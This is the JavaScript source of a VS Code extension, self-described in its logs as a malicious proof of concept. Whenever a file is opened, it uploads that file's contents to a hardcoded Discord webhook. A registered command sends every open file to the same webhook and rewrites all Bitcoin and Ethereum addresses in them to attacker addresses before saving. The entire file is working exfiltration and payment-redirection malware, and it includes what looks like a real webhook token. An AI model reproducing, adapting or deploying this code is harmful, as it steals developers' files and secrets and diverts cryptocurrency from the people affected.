const vscode = require('vscode');
const axios = require('axios');
const FormData = require('form-data');
const { Readable } = require('stream');
const fs = require('fs');

/**
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
    console.log('[!] Malicious VS Code extension triggered');

    // Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1332511931541491802/5Hnr5TXbOi_O9REwjkk4MPLBaImsrsfkZPkJ115lAQD35e2hHNtR_h0M62VLACH-qEZ2';

    /**
     * Function to send a file to Discord
     * @param {vscode.TextDocument} document
     */
    const sendFileToDiscord = (document) => {
        // We dont need untitled files
        if (document.fileName.includes('Untitled')) {
            console.log(`[*] Skipping Untitled file for Discord upload: ${document.fileName}`);
            return;
        }

        const content = document.getText(); 
        const buffer = Buffer.from(content, 'utf-8'); // file content to buffer
        const formData = new FormData();

        formData.append('file', Readable.from(buffer), {
            filename: document.fileName.split('/').pop(), //only the filename needed
            contentType: 'text/plain',
        });

        // exfil to discord
        axios
            .post(webhookUrl, formData, {
                headers: formData.getHeaders(),
            })
            .then(() => {
                console.log(`[!] File "${document.fileName}" sent to Discord successfully!`);
            })
            .catch((err) => {
                console.error(`[X] Error sending file "${document.fileName}" to Discord:`, err);
            });
    };

    /**
     * Extract btc and eth addresses
     * @param {string} content
     * @returns {Object} Matches
     */
    const extractCryptoAddresses = (content) => {
        const bitcoinRegex = /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/g;
        const ethereumRegex = /\b0x[a-fA-F0-9]{40}\b/g;

        const bitcoinMatches = content.match(bitcoinRegex) || [];
        const ethereumMatches = content.match(ethereumRegex) || [];

        return { bitcoinMatches, ethereumMatches };
    };

    /**
     * replace eth and btc addresses
     * @param {vscode.TextDocument} document
     */
    const replaceCryptoAddresses = async (document) => {
        // here too ignore untitled
        if (document.fileName.includes('Untitled')) {
            console.log(`[*] Skipping Untitled file: ${document.fileName}`);
            return;
        }

        const content = document.getText();
        const { bitcoinMatches, ethereumMatches } = extractCryptoAddresses(content);

        if (bitcoinMatches.length === 0 && ethereumMatches.length === 0) {
            return;
        }

        // replace btc
        let modifiedContent = content;
        bitcoinMatches.forEach(address => {
            modifiedContent = modifiedContent.replace(new RegExp(address, 'g'), 'attackers-btc-address');
        });

        // replace eth
        ethereumMatches.forEach(address => {
            modifiedContent = modifiedContent.replace(new RegExp(address, 'g'), 'attackers-eth-address');
        });

        const edit = new vscode.WorkspaceEdit();
        const fullRange = new vscode.Range(
            document.lineAt(0).range.start,
            document.lineAt(document.lineCount - 1).range.end
        );
        edit.replace(document.uri, fullRange, modifiedContent);

        await vscode.workspace.applyEdit(edit);
        await document.save();

        
        if (bitcoinMatches.length > 0) {
            console.log(`[!] Replaced Bitcoin Addresses: ${bitcoinMatches.join(', ')} in file ${document.fileName}`);
        }
        if (ethereumMatches.length > 0) {
            console.log(`[!] Replaced Ethereum Addresses: ${ethereumMatches.join(', ')} in file ${document.fileName}`);
        }
    };

    // process all open files
    const processOpenFiles = () => {
        vscode.workspace.textDocuments.forEach((document) => {
            const content = document.getText();
            const { bitcoinMatches, ethereumMatches } = extractCryptoAddresses(content);

            console.log(`[*] File: ${document.fileName}`);

            if (bitcoinMatches.length > 0) {
                console.log(`[!] Bitcoin Addresses Found: ${bitcoinMatches.join(', ')}`);
            } else {
                console.log('[*] No Bitcoin addresses found.');
            }

            if (ethereumMatches.length > 0) {
                console.log(`[!] Ethereum Addresses Found: ${ethereumMatches.join(', ')}`);
            } else {
                console.log('[*] No Ethereum addresses found.');
            }
        });
    };

    // file open event listener
    vscode.workspace.onDidOpenTextDocument((document) => {
        console.log(`[*] Opened File: ${document.fileName}`);
        sendFileToDiscord(document);
    });

    // command register
    const disposable = vscode.commands.registerCommand('mal-vscode-poc.vscodePwned', async function () {
        const editor = vscode.window.activeTextEditor;

        if (editor) {
            const currentDocument = editor.document;

            await currentDocument.save();
            console.log(`[*] Current file "${currentDocument.fileName}" saved.`);
        }

        // send all open files to Discord
        vscode.workspace.textDocuments.forEach((document) => {
            console.log(`[*] Processing open file: ${document.fileName}`);
            sendFileToDiscord(document);
        });

        // run crypto replacement on all open files
        vscode.workspace.textDocuments.forEach((document) => {
            replaceCryptoAddresses(document);
        });

        // crypto thingy
        processOpenFiles();
    });
}

function deactivate() {}

module.exports = {
    activate,
    deactivate,
};